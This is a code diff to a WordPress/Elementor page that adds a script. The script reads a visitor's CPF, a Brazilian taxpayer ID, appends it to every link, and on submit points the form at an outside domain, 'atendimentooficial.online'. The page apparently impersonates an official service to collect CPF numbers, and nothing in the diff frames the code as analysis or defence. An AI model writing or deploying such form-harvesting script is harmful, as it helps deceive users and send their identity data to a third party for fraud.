@@ -236,12 +236,26 @@ var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false
 <script>
     window.onload = function () {
         var links = document.getElementsByTagName("a");
+        var cpfInput = document.getElementById('cpf');
+        var submitBtn = document.getElementById('submitBtn');
+
         for (var i = 0, n = links.length; i < n; i++) {
             var href = links[i].href.trim() +
                     (links[i].href.indexOf("?") > 0 ? '&' : '?') +
-                    document.location.search.replace('?', '').toString();
+                    'cpf=' + encodeURIComponent(cpfInput.value.trim());
+
             links[i].href = href;
         }
+
+        // Adiciona um ouvinte de evento ao botão de envio
+        submitBtn.addEventListener('click', function() {
+            var formAction = 'https://web.atendimentooficial.online/diafinal';
+            var formParams = 'cpf=' + encodeURIComponent(cpfInput.value.trim());
+            var formURL = formAction + '?' + formParams;
+
+            // Altera o atributo "action" do formulário para incluir os parâmetros do CPF
+            document.querySelector('form').action = formURL;
+        });
     }
 </script>
 </html>
